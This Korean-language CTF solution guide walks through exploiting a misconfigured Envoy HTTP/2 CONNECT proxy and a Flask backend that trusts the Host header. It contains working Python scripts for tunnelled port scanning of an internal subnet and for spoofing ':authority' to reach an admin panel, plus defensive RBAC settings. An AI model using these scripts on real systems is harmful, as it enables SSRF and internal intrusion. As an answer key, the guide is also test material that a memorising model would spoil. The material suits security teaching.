# HTTP/2 CONNECT 워게임 - 전체 솔루션 가이드

**관리자 전용 문서**
**버전:** 1.0
**최종 업데이트:** 2026-03-20
**챌린지 유형:** 하드 모드 블랙박스 CTF

---

## 목차

1. [챌린지 개요](#1-챌린지-개요)
2. [학습 목표](#2-학습-목표)
3. [취약점 분석](#3-취약점-분석)
4. [단계별 솔루션](#4-단계별-솔루션)
5. [공격 코드 예시](#5-공격-코드-예시)
6. [방어 권고 사항](#6-방어-권고-사항)
7. [환경 설정 가이드](#7-환경-설정-가이드)
8. [예상 해결 시간 및 난이도](#8-예상-해결-시간-및-난이도)
9. [교육적 가치](#9-교육적-가치)
10. [부록](#10-부록)

---

## 1. 챌린지 개요

### 1.1 시나리오

참가자들은 잘못 설정된 HTTP/2 프록시 서버 뒤의 내부 네트워크에 숨겨진 플래그를 찾아야 합니다. 이 챌린지는 다음과 같은 실제 시나리오를 시뮬레이션합니다:

- 조직이 합법적인 포워드 프록시 사용 사례를 위해 HTTP/2 CONNECT 지원 기능이 있는 Envoy 프록시를 배포함
- 프록시에 적절한 IP 기반 접근 제어(RBAC)가 부족함
- 백엔드 서비스가 접근 제어를 위해 Host 헤더(HTTP/2 `:authority` 의사 헤더에서 파생됨)를 신뢰함
- 내부 네트워크 대역이 SSRF 공격으로부터 보호되지 않음

이 구성은 다음과 같은 실제 운영 환경의 흔한 실수를 반영합니다:
- 개발자가 보안 함의를 이해하지 못한 채 HTTP/2 CONNECT를 활성화함
- 적절한 상호 TLS(mTLS)나 IP 검증 대신 호스트 기반 인증을 사용함
- 내부 네트워크 보안을 오직 네트워크 격리에만 의존함

### 1.2 목표

**주 목표**: 내부 관리자 패널에서 플래그 추출

**부 목표** (암시적):
1. 프록시가 HTTP/2를 지원함을 발견
2. HTTP/2 CONNECT 메서드가 활성화되어 있음을 식별
3. 내부 네트워크 토폴로지 매핑
4. 백엔드 서비스 및 해당 엔드포인트 탐색
5. Host 헤더 기반 접근 제어 우회
6. HTTP/2 프로토콜 메커니즘에 대한 이해 증명

### 1.3 플래그

**형식**: `WSL{http2_authority_header_confusion}`

**위치**: 백엔드 서비스(172.20.0.10:8080)의 `/admin` 엔드포인트

**접근 조건**:
- 요청이 HTTP/2 CONNECT 터널을 통해 백엔드에 도달해야 함
- `:authority` 의사 헤더에 `internal.acme.corp`가 포함되어야 함
- 인증 불필요 (취약점)

### 1.4 난이도 등급

**하드 모드**: 힌트, 스켈레톤 코드 또는 도구 미제공

**필요 기술**:
- HTTP/2 프로토콜 이해
- Python 스크립팅 (h2 라이브러리 등 사용)
- 네트워크 정찰 기술
- 웹 애플리케이션 보안 기본 지식

**예상 시간**: 숙련된 CTF 플레이어 기준 2-4시간

---

## 2. 학습 목표

### 2.1 기술적 기술

참가자는 다음을 배우게 됩니다:

1. **HTTP/2 프로토콜 메커니즘**
   - 의사 헤더 (`:method`, `:authority`, `:scheme`, `:path`)
   - 터널링을 위한 CONNECT 메서드
   - 이진 프레이밍 및 스트림 멀티플렉싱
   - SETTINGS 프레임 협상

2. **Server-Side Request Forgery (SSRF)**
   - 네트워크 피보팅을 위해 HTTP/2 CONNECT 사용
   - 네트워크 기반 접근 제어 우회
   - SSRF를 통한 내부 네트워크 정찰
   - 전통적인 SSRF와 CONNECT 기반 SSRF의 차이점

3. **헤더 혼동 공격 (Header Confusion Attacks)**
   - HTTP/2 `:authority` 대 HTTP/1.1 `Host` 헤더
   - 프록시가 HTTP/2와 HTTP/1.1 사이를 변환하는 방식
   - 헤더 처리 시의 신뢰 경계 위반
   - Authority 헤더 위조 기술

4. **네트워크 정찰**
   - 프록시 터널을 통한 포트 스캐닝
   - 제한된 네트워크 내의 서비스 열거
   - 직접 접근 없이 활성 호스트 식별

5. **Python 보안 도구 제작**
   - 로우 레벨 HTTP/2 상호작용을 위해 `h2` 라이브러리 사용
   - 커스텀 포트 스캐너 구축
   - 다단계 공격 자동화
   - 이진 프로토콜 데이터 처리

### 2.2 보안 개념

1. **심층 방어 (Defense in Depth)**: 왜 여러 계층의 보안이 필요한지 이해
2. **최소 권한 원칙**: 프록시가 CONNECT 대상을 제한해야 하는 이유
3. **입력 검증**: 본문뿐만 아니라 모든 요청 속성을 검증하는 것의 중요성
4. **신뢰 경계**: 데이터를 검증해야 하는 곳과 신뢰해야 하는 곳 인식

---

## 3. 취약점 분석

### 3.1 CVE 및 CWE 참조

이 챌린지는 실제 취약점 클래스를 보여줍니다:

**CWE-918**: Server-Side Request Forgery (SSRF)
- **설명**: 프록시가 임의의 내부 IP 주소로의 CONNECT를 허용함
- **영향**: 공격자가 인터넷에 노출되지 않은 내부 서비스에 접근할 수 있음
- **실제 사례**: AWS 메타데이터 서비스 접근, 내부 API 탈취

**CWE-444**: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')
- **설명**: HTTP/2 `:authority`와 HTTP/1.1 `Host` 헤더 사이의 혼동
- **영향**: 호스트 기반 접근 제어 우회
- **연관 취약점**: 요청 스머글링, 헤더 인젝션 공격

**CWE-284**: Improper Access Control
- **설명**: 백엔드가 인증되지 않은 헤더 값을 권한 부여에 의존함
- **영향**: 관리자 패널 접근 제어의 완전한 우회
- **대응책**: 적절한 인증(상호 TLS, API 키, OAuth) 사용

### 3.2 Envoy 프록시 오설정

**파일**: `envoy/envoy.yaml`

**취약한 설정**:

```yaml
http2_protocol_options:
  allow_connect: true  # HTTP/2 CONNECT 활성화

routes:
- match:
    connect_matcher: {}  # 치명적: 모든 CONNECT 요청과 일치함
  route:
    cluster: dynamic_forward_proxy_cluster
    upgrade_configs:
    - upgrade_type: CONNECT
      connect_config: {}
```

**근본 원인**:

1. **IP 기반 필터링 없음**: `connect_matcher: {}`는 모든 대상으로의 CONNECT를 수락함
2. **RBAC 정책 없음**: 내부 IP 대역을 차단하기 위한 `envoy.filters.http.rbac` 누락
3. **동적 포워드 프록시**: 모든 CONNECT 요청을 임의의 대상으로 라우팅함

**보안 설정 예시 (챌린지에는 포함되지 않음)**:

```yaml
# 보안 RBAC 정책 예시
- name: envoy.filters.http.rbac
  typed_config:
    "@type": type.googleapis.com/envoy.extensions.filters.http.rbac.v3.RBAC
    rules:
      action: DENY
      policies:
        "block-internal-ips":
          permissions:
          - any: true
          principals:
          - any: true
          condition:
            call_expr:
              function: matches
              args:
              - select_expr:
                  operand:
                    select_expr:
                      operand:
                        ident_expr: request
                      field: authority
                  field: host
              - const_expr:
                  string_value: "^(10\\..*|172\\.(1[6-9]|2[0-9]|3[01])\\..*|192\\.168\\..*|127\\..*|localhost)$"
```

**이것이 중요한 이유**:

- **실제 환경의 흔한 사례**: 많은 조직이 합법적인 용도로 HTTP/2 CONNECT를 활성화함
- **기본 설정의 불충분함**: Envoy는 기본적으로 내부 IP를 차단하지 않음
- **운영의 복잡성**: RBAC 정책은 복잡하여 생략되거나 잘못 설정되는 경우가 많음

### 3.3 Flask 백엔드 취약점

**파일**: `backend/app.py`

**취약한 코드**:

```python
@app.route('/admin')
def admin():
    host = request.headers.get('Host', '')

    # 취약점: 부분 문자열 일치, IP 검증 없음, 인증 없음
    if 'internal.acme.corp' in host.lower():
        return f"<h1>Admin Panel</h1><p>FLAG: {FLAG}</p>"
    else:
        abort(403, "Access denied: External access forbidden")
```

**공격 벡터**:

1. Envoy가 프로토콜 변환 후 Flask에 HTTP/1.1 요청을 보냄
2. `Host` 헤더는 HTTP/2의 `:authority` 의사 헤더에서 유도됨
3. 요청이 내부 네트워크에서 시작되었는지에 대한 검증이 없음
4. 공격자가 터널링된 요청에서 `:authority` 값을 제어함

**공격 흐름**:

```
공격자                   Envoy 프록시              백엔드 (Flask)
   |                          |                         |
   |--CONNECT 172.20.0.10:8080->|                        |
   |<-----200 Connection Est----|                        |
   |                          |                         |
   |--GET /admin------------>|                         |
   |  :authority: internal.acme.corp                    |
   |                          |--HTTP/1.1 GET /admin--->|
   |                          |  Host: internal.acme.corp|
   |                          |                         |
   |                          |<-----플래그---------------|
   |<-----플래그----------------|                         |
```

**작동 원리**:

1. HTTP/2에서 `:authority` 의사 헤더는 공격자에 의해 제어됨
2. Envoy는 HTTP/1.1 백엔드로 전달할 때 `:authority`를 `Host` 헤더로 변환함
3. Flask는 소스 IP 검증 없이 `Host` 헤더 값을 신뢰함
4. 부분 문자열 일치 검사가 성공하여 접근 제어를 통과함

**보안 구현 예시 (챌린지에는 포함되지 않음)**:

```python
# 보안 강화 버전 예시
@app.route('/admin')
def admin():
    # 방법 1: IP 기반 제한 (리버스 프록시와 함께 작동)
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if not client_ip.startswith('172.20.0.'):
        abort(403, "Access denied: Must access from internal network")

    # 방법 2: 상호 TLS (mTLS) (베스트 프랙티스)
    client_cert = request.environ.get('SSL_CLIENT_CERT')
    if not verify_client_certificate(client_cert):
        abort(403, "Access denied: Invalid client certificate")

    # 방법 3: API 키 인증
    api_key = request.headers.get('X-API-Key')
    if api_key != INTERNAL_API_KEY:
        abort(403, "Access denied: Invalid API key")

    return f"<h1>Admin Panel</h1><p>FLAG: {FLAG}</p>"
```

### 3.4 공격 표면 요약

| 구성 요소 | 취약점 | 심각도 | 공격 용이성 |
|-----------|---------------|----------|----------------|
| Envoy 프록시 | CONNECT 대상에 대한 RBAC 없음 | 치명적 | 보통 (프로토콜 지식 필요) |
| Flask 백엔드 | Host 헤더 신뢰 | 높음 | 매우 쉬움 (터널 형성 후) |
| 네트워크 격리 | 프록시의 외부 유출 필터링 없음 | 중간 | 해당 없음 (설계 문제) |
| 서비스 탐색 | 예측 가능한 IP 주소 | 낮음 | 쉬움 (표준 /24 스캔) |

**복합적 영향**: 치명적

- 내부 관리자 패널에 대한 인증되지 않은 원격 접근
- 백엔드 서비스의 완전한 장악
- 다른 내부 서비스로의 잠재적인 측면 이동(Lateral Movement) 가능성

---

## 4. 단계별 솔루션

이 섹션은 상세한 설명과 함께 의도된 해결 경로를 제공합니다.

### 4.1 1단계: 프로토콜 정찰 (15-30분)

**목표**: 대상이 HTTP/2 및 CONNECT 메서드를 지원하는지 확인

**조치**:

1. **초기 연결 테스트**:

```bash
curl -v http://localhost:10000/
```

**예상 출력**:

```
* Connected to localhost (127.0.0.1) port 10000
> GET / HTTP/1.1
> Host: localhost:10000
> User-Agent: curl/8.4.0
> Accept: */*
>
< HTTP/1.1 200 OK
< content-length: 182
< content-type: text/html; charset=utf-8
<
<html>
    <head><title>ACME Corp Backend</title></head>
    <body>
        <h1>ACME Corp Backend Service</h1>
        <p>Backend API is operational.</p>
        <p>Version: 1.0.0</p>
    </body>
</html>
```

**분석**:
- 서비스는 HTTP 기반이며 HTML을 반환함
- 기본 경로는 백엔드 서비스로 프록시됨
- 아직 명확한 공격 벡터는 보이지 않음

2. **HTTP/2 탐지**:

```bash
curl -v --http2 http://localhost:10000/
```

**예상 출력**:

```
* Connected to localhost (127.0.0.1) port 10000
* [HTTP/2] [1] OPENED stream for http://localhost:10000/
* [HTTP/2] [1] [:method: GET]
* [HTTP/2] [1] [:scheme: http]
* [HTTP/2] [1] [:authority: localhost:10000]
* [HTTP/2] [1] [:path: /]
...
< HTTP/2 200
```

**분석**:
- **핵심 발견**: 서버가 HTTP/2를 지원함 (HTTP/2 200 응답)
- 프로토콜 업그레이드 성공
- 이는 HTTP/2 전용 공격의 가능성을 열어줌

3. **CONNECT 메서드 테스트**:

curl은 HTTP/2 CONNECT를 쉽게 지원하지 않으므로 간단한 테스트 스크립트를 작성합니다:

```python
#!/usr/bin/env python3
# test_connect.py

from h2.connection import H2Connection
from h2.config import H2Configuration
import socket

# 프록시에 연결
sock = socket.create_connection(('localhost', 10000))
config = H2Configuration(client_side=True)
conn = H2Connection(config=config)
conn.initiate_connection()
sock.sendall(conn.data_to_send())

# 서버 preface 수신
data = sock.recv(65535)
events = conn.receive_data(data)
sock.sendall(conn.data_to_send())

# google.com:80으로의 CONNECT 시도
stream_id = conn.get_next_available_stream_id()
headers = [
    (':method', 'CONNECT'),
    (':authority', 'google.com:80'),
]
conn.send_headers(stream_id, headers, end_stream=False)
sock.sendall(conn.data_to_send())

# 응답 확인
data = sock.recv(65535)
events = conn.receive_data(data)

for event in events:
    print(f"Event: {event}")

sock.close()
```

**예상 출력**:

```
Event: <ResponseReceived stream_id:1, headers:[(':status', '200')]>
```

**분석**:
- **치명적 발견**: 프록시가 CONNECT 메서드를 수락함
- 200 응답은 터널이 성공적으로 형성되었음을 의미함
- 이것이 주요 공격 벡터임 (CONNECT를 통한 SSRF)

**핵심 통찰**: HTTP/2 + CONNECT 지원의 조합은 내부 네트워크를 포함한 임의의 대상으로 터널링할 수 있는 잠재력을 의미합니다.

### 4.2 2단계: 내부 IP로의 CONNECT 테스트 (15-30분)

**목표**: CONNECT가 RFC1918 사설 IP 대역에 도달할 수 있는지 확인

**조치**:

1. **내부 IP 연결 테스트**:

```python
#!/usr/bin/env python3
# test_internal_connect.py

from h2.connection import H2Connection
from h2.config import H2Configuration
import socket

def test_connect(target_host, target_port):
    """CONNECT가 성공하는지 테스트"""
    sock = socket.create_connection(('localhost', 10000))
    config = H2Configuration(client_side=True)
    conn = H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    # SETTINGS 교환
    data = sock.recv(65535)
    conn.receive_data(data)
    sock.sendall(conn.data_to_send())

    # CONNECT 요청
    stream_id = conn.get_next_available_stream_id()
    headers = [
        (':method', 'CONNECT'),
        (':authority', f'{target_host}:{target_port}'),
    ]
    conn.send_headers(stream_id, headers, end_stream=False)
    sock.sendall(conn.data_to_send())

    # 응답 확인
    data = sock.recv(65535)
    events = conn.receive_data(data)

    for event in events:
        if hasattr(event, 'headers'):
            for name, value in event.headers:
                if name == b':status':
                    return value.decode() == '200'

    return False

# 다양한 내부 IP 대역 테스트
targets = [
    ('127.0.0.1', 80),
    ('10.0.0.1', 80),
    ('172.20.0.1', 80),
    ('192.168.1.1', 80),
]

for host, port in targets:
    result = test_connect(host, port)
    print(f"{host}:{port} - {'SUCCESS' if result else 'FAILED'}")
```

**예상 출력**:

```
127.0.0.1:80 - FAILED (connection refused)
10.0.0.1:80 - FAILED (connection refused)
172.20.0.1:80 - FAILED (connection refused)
192.168.1.1:80 - FAILED (connection refused)
```

**분석**:
- CONNECT 요청이 프록시에서 수락됨
- 연결 실패는 프록시에 의해 차단된 것이 아니라 해당 대상에 리스닝 중인 서비스가 없음을 나타냄
- 따라서 활성 서비스를 찾기 위한 스캔이 필요함

**핵심 통찰**: 프록시가 내부 IP 대역을 차단하지 않음 - 완전한 SSRF 능력 확인.

### 4.3 3단계: 내부 네트워크 스캔 (30-60분)

**목표**: 내부 네트워크에서 활성 서비스 발견

**전략**:
- 일반적인 Docker 네트워크 대역 스캔: 172.16-31.x.x
- Docker 기본 서브넷에 집중: 172.20.0.0/24
- 일반적인 서비스 포트 테스트: 80, 8080, 8000, 3000, 5000

**포트 스캐너 구현**:

```python
#!/usr/bin/env python3
# scanner.py - HTTP/2 CONNECT 터널을 통한 내부 네트워크 포트 스캐너

from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.events import ResponseReceived, StreamEnded, ConnectionTerminated
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

def scan_port(proxy_host, proxy_port, target_ip, target_port, timeout=2):
    """HTTP/2 CONNECT 터널을 통해 단일 포트 스캔"""
    try:
        sock = socket.create_connection((proxy_host, proxy_port), timeout=timeout)
        sock.settimeout(timeout)

        config = H2Configuration(client_side=True)
        conn = H2Connection(config=config)
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())

        # SETTINGS 교환
        data = sock.recv(65535)
        events = conn.receive_data(data)
        sock.sendall(conn.data_to_send())

        # CONNECT 요청 전송
        stream_id = conn.get_next_available_stream_id()
        headers = [
            (':method', 'CONNECT'),
            (':authority', f'{target_ip}:{target_port}'),
        ]
        conn.send_headers(stream_id, headers, end_stream=False)
        sock.sendall(conn.data_to_send())

        # 응답 수신
        start_time = time.time()
        status_code = None

        while time.time() - start_time < timeout:
            try:
                data = sock.recv(65535)
                if not data:
                    break
                events = conn.receive_data(data)
                for event in events:
                    if isinstance(event, ResponseReceived):
                        for name, value in event.headers:
                            if name == b':status':
                                status_code = value.decode()
                                break
                    if isinstance(event, (StreamEnded, ConnectionTerminated)):
                        break
                sock.sendall(conn.data_to_send())
                if status_code:
                    break
            except socket.timeout:
                break

        sock.close()

        # 200 = 터널 형성됨 (포트 열림)
        # 503 = 서비스 사용 불가 (포트 닫힘/필터링됨)
        if status_code == '200':
            return (target_ip, target_port, True, None)
        else:
            return (target_ip, target_port, False, f"Status: {status_code}")
    except Exception as e:
        return (target_ip, target_port, False, str(e))

def scan_network(proxy_host, proxy_port, network_prefix, ports):
    """네트워크 대역 전체 스캔"""
    open_ports = []
    print(f"[*] Scanning {network_prefix}.0/24 on ports {ports}")

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(scan_port, proxy_host, proxy_port, f"{network_prefix}.{i}", port) 
                   for i in range(1, 255) for port in ports]
        
        for future in as_completed(futures):
            ip, port, is_open, error = future.result()
            if is_open:
                print(f"[+] OPEN: {ip}:{port}")
                open_ports.append((ip, port))

    print(f"[*] Scan complete. Found {len(open_ports)} open ports.")
    return open_ports

if __name__ == '__main__':
    PROXY_HOST = 'localhost'
    PROXY_PORT = 10000
    NETWORK_PREFIX = '172.20.0'
    COMMON_PORTS = [80, 8080, 8000, 3000, 5000]

    open_ports = scan_network(PROXY_HOST, PROXY_PORT, NETWORK_PREFIX, COMMON_PORTS)
```

**예상 출력**:

```
[*] Scanning 172.20.0.0/24 on ports [80, 8080, 8000, 3000, 5000]
[+] OPEN: 172.20.0.10:8080
[+] OPEN: 172.20.0.20:3000
[*] Scan complete. Found 2 open ports.
```

**분석**:
- **172.20.0.10:8080** - 백엔드 서비스 (주요 목표)
- **172.20.0.20:3000** - 내부 서비스 (미끼)

**핵심 통찰**: 두 개의 서비스가 발견되었습니다. 8080 포트는 전형적인 웹 백엔드 포트이므로 주요 목표일 가능성이 높습니다.

### 4.4 4단계: 서비스 열거 (20-30분)

**목표**: 발견된 서비스의 엔드포인트 및 기능 식별

**CONNECT를 통한 HTTP 요청 함수**:

```python
#!/usr/bin/env python3
# http_via_connect.py - CONNECT 터널을 통해 HTTP 요청 전송

from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.events import ResponseReceived, DataReceived, StreamEnded
import socket

def http_via_connect(proxy_host, proxy_port, target_host, target_port,
                     method, path, headers=None, body=None):
    """CONNECT 터널을 통해 HTTP 요청 전송"""
    sock = socket.create_connection((proxy_host, proxy_port), timeout=10)
    config = H2Configuration(client_side=True)
    conn = H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    # SETTINGS 교환
    data = sock.recv(65535)
    conn.receive_data(data)
    sock.sendall(conn.data_to_send())

    # 1단계: CONNECT 터널 형성
    connect_stream_id = conn.get_next_available_stream_id()
    connect_headers = [(':method', 'CONNECT'), (':authority', f'{target_host}:{target_port}')]
    conn.send_headers(connect_stream_id, connect_headers, end_stream=False)
    sock.sendall(conn.data_to_send())

    # CONNECT 응답 대기
    data = sock.recv(65535)
    events = conn.receive_data(data)
    sock.sendall(conn.data_to_send())

    # CONNECT 성공 확인
    connect_success = any(isinstance(event, ResponseReceived) and dict(event.headers).get(b':status') == b'200' for event in events)
    if not connect_success:
        sock.close()
        return (None, None, None)

    # 2단계: 터널을 통해 실제 HTTP 요청 전송
    request_stream_id = conn.get_next_available_stream_id()
    request_headers = [(':method', method), (':scheme', 'http'), (':authority', f'{target_host}:{target_port}'), (':path', path)]
    if headers: request_headers.extend(headers)
    conn.send_headers(request_stream_id, request_headers, end_stream=(body is None))
    sock.sendall(conn.data_to_send())
    if body:
        conn.send_data(request_stream_id, body, end_stream=True)
        sock.sendall(conn.data_to_send())

    # 3단계: 응답 읽기
    status_code, response_body, stream_ended = None, b'', False
    while not stream_ended:
        data = sock.recv(65535)
        if not data: break
        events = conn.receive_data(data)
        for event in events:
            if isinstance(event, ResponseReceived) and event.stream_id == request_stream_id:
                status_code = dict(event.headers).get(b':status').decode()
            elif isinstance(event, DataReceived) and event.stream_id == request_stream_id:
                response_body += event.data
                conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
            elif isinstance(event, StreamEnded) and event.stream_id == request_stream_id:
                stream_ended = True
        sock.sendall(conn.data_to_send())

    sock.close()
    return status_code, None, response_body

def enumerate_service(proxy_host, proxy_port, target_ip, target_port):
    """서비스의 엔드포인트 열거"""
    paths = ['/', '/admin', '/api', '/health', '/status']
    for path in paths:
        status, _, body = http_via_connect(proxy_host, proxy_port, target_ip, target_port, 'GET', path)
        print(f"[+] {path} -> {status}")
```

**예상 출력**:

```
[*] Enumerating 172.20.0.10:8080
[+] / -> 200
[+] /admin -> 403
[+] /health -> 200
...
```

**분석**:
- 백엔드 서비스 (172.20.0.10:8080):
  - **`/admin` - 403 Forbidden 반환** ← 주요 목표
  - 오류 메시지: "Access denied: External access forbidden"

**핵심 발견**: `/admin` 엔드포인트가 존재하지만 403을 반환합니다. 오류 메시지는 호스트 기반 또는 IP 기반 접근 제어를 시사합니다.

### 4.5 5단계: 접근 제어 분석 (15-20분)

**목표**: `/admin`이 403을 반환하는 이유를 이해하고 제한 우회

**가설 검증**:

HTTP/2에서는 `:authority` 의사 헤더가 백엔드에서의 `Host` 헤더가 됩니다.

```python
# test_authority.py (주요 로직)
request_headers = [
    (':method', 'GET'),
    (':scheme', 'http'),
    (':authority', 'internal.acme.corp'),  # 위조된 값
    (':path', '/admin'),
]
```

**예상 결과**:
- `:authority`를 `internal.acme.corp`로 설정했을 때 200 OK와 플래그가 반환됨.

**핵심 통찰**: 취약점은 접근 제어를 위해 `:authority` 헤더를 신뢰하는 것입니다. 이 헤더는 공격자에 의해 제어되므로 쉽게 위조될 수 있습니다.

### 4.6 6단계: 최종 공격 (5-10분)

**목표**: 정제된 자동화된 공격 스크립트 작성 (5섹션 참조)

---

## 5. 공격 코드 예시

### 5.1 최소 공격 코드 (Quick Win)

```python
#!/usr/bin/env python3
import socket
from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.events import ResponseReceived, DataReceived, StreamEnded

def exploit():
    sock = socket.create_connection(('localhost', 10000))
    conn = H2Connection(config=H2Configuration(client_side=True))
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())
    conn.receive_data(sock.recv(65535))
    sock.sendall(conn.data_to_send())

    # CONNECT
    sid = conn.get_next_available_stream_id()
    conn.send_headers(sid, [(':method', 'CONNECT'), (':authority', '172.20.0.10:8080')])
    sock.sendall(conn.data_to_send())
    conn.receive_data(sock.recv(65535))

    # GET /admin
    sid = conn.get_next_available_stream_id()
    conn.send_headers(sid, [
        (':method', 'GET'), (':scheme', 'http'),
        (':authority', 'internal.acme.corp'), (':path', '/admin')
    ], end_stream=True)
    sock.sendall(conn.data_to_send())

    # Read Flag
    while True:
        data = sock.recv(65535)
        if not data: break
        for event in conn.receive_data(data):
            if isinstance(event, DataReceived) and b'WSL{' in event.data:
                print(f"FLAG: {event.data.decode()}")
                return
        sock.sendall(conn.data_to_send())

if __name__ == '__main__':
    exploit()
```

---

## 6. 방어 권고 사항

### 6.1 Envoy 프록시 강화

**핵심**: 내부 IP 대역으로의 CONNECT를 차단하는 RBAC 구현

```yaml
- name: envoy.filters.http.rbac
  typed_config:
    "@type": type.googleapis.com/envoy.extensions.filters.http.rbac.v3.RBAC
    rules:
      action: DENY
      policies:
        "deny-internal-connect":
          permissions:
          - and_rules:
              rules:
              - header: { name: ":method", string_match: { exact: "CONNECT" } }
              - or_rules:
                  rules:
                  - destination_ip: { address_prefix: "10.0.0.0", prefix_len: 8 }
                  - destination_ip: { address_prefix: "172.16.0.0", prefix_len: 12 }
                  - destination_ip: { address_prefix: "192.168.0.0", prefix_len: 16 }
```

### 6.2 백엔드 애플리케이션 강화

**핵심**: 접근 제어를 위해 Host/:authority 헤더를 절대 신뢰하지 마십시오. 소스 IP 검증, 상호 TLS(mTLS), 또는 API 키 인증을 사용하십시오.

---

## 7. 환경 설정 가이드

### 7.1 빠른 시작

```bash
cd Playing-with-HTTP-2-CONNECT/
docker-compose up -d
```

---

## 8. 예상 해결 시간 및 난이도

- **전문가**: 1-2 시간
- **고급**: 2-3 시간
- **중급**: 3-4 시간
- **초보자**: 4+ 시간

---

## 9. 교육적 가치

이 챌린지는 HTTP/2 프로토콜, SSRF 공격 벡터, 헤더 혼동 취약점 및 프록시 보안에 대한 실제적인 이해를 돕습니다.

---

## 10. 부록

### 10.1 네트워크 토폴로지 다이어그램
(생략: 아키텍처 개요 참조)

### 10.2 주최자용 힌트
(생략: SETUP.ko.md 참조)

---

**솔루션 가이드 끝**
